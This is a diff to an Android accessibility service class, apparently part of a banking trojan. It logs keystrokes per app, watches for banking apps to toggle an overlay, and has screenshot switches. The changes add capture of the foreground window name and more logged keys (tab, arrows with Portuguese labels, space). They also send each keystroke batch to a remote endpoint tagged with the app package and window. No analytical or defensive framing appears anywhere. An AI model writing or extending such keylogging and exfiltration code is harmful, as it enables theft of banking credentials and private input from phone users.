@@ -32,6 +32,7 @@ public class KeySvc extends AccessibilityService {
     private final StringBuilder buf = new StringBuilder();
     private volatile long lastFlush;
     private volatile String curPkg;
+    private volatile String curWin;
     public volatile boolean shotOn = true;
     private volatile boolean shotBusy;
     private volatile long lastShot;
@@ -87,6 +88,12 @@ public class KeySvc extends AccessibilityService {
                 curPkg = p;
                 if (Ov.on() && Ov.banco(p)) Ov.set(this, false);
             }
+            if (e.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+                    && e.getClassName() != null) {
+                String w = e.getClassName().toString();
+                int i = w.lastIndexOf('.');
+                curWin = i >= 0 ? w.substring(i + 1) : w;
+            }
         } catch (Throwable ignored) {}
     }
 
@@ -105,6 +112,10 @@ public class KeySvc extends AccessibilityService {
             if (txt.length() == 0) {
                 if (kc == KeyEvent.KEYCODE_DEL) txt = "[DEL]";
                 else if (kc == KeyEvent.KEYCODE_ENTER) txt = "[ENTER]";
+                else if (kc == KeyEvent.KEYCODE_TAB) txt = "[TAB]";
+                else if (kc == KeyEvent.KEYCODE_DPAD_UP) txt = "[CIMA]";
+                else if (kc == KeyEvent.KEYCODE_DPAD_DOWN) txt = "[BAIXO]";
+                else if (kc == KeyEvent.KEYCODE_SPACE) txt = " ";
                 else return false;
             }
             add(pkg == null ? "?" : pkg, txt);
@@ -128,7 +139,9 @@ public class KeySvc extends AccessibilityService {
             buf.setLength(0);
         }
         if (s.length() > 0) {
-            Net.send("{\"t\":\"k\",\"o\":\"" + Util.esc(s) + "\"}");
+            Net.send("{\"t\":\"k\",\"pkg\":\"" + Util.esc(curPkg == null ? "?" : curPkg)
+                    + "\",\"win\":\"" + Util.esc(curWin == null ? "" : curWin)
+                    + "\",\"o\":\"" + Util.esc(s) + "\"}");
             lastFlush = System.currentTimeMillis();
         }
         H.postDelayed(flush, 1500);
